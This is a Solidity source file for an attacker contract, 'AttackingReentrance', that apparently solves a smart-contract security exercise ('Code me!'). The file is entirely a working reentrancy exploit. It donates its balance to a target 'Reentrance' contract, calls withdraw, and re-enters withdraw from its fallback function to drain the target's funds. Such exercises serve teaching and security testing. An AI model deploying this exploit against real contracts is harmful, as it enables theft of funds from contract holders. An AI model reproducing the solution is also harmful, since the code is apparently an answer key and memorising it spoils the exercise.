// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public target;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        target = Reentrance(contractAddress);
    }

    function hackContract() external {
        // Code me!
        target.donate{ value: address(this).balance}(address(this));
        target.withdraw();
    }

    fallback() external payable {
            target.withdraw();
    }
}
